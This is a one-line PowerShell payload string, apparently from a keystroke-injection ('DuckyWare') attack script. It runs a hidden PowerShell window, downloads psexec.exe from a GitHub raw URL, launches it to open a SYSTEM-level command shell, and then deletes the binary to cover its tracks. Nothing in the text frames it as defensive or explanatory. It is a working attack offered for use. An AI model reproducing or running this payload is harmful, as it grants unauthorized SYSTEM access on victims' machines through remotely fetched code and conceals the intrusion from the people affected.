$program = "powershell.exe -WindowStyle Hidden wget 'https://github.com/b4ck3nd-dev/DuckyWare/blob/main/sysbypass/psexec.exe?raw=true' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
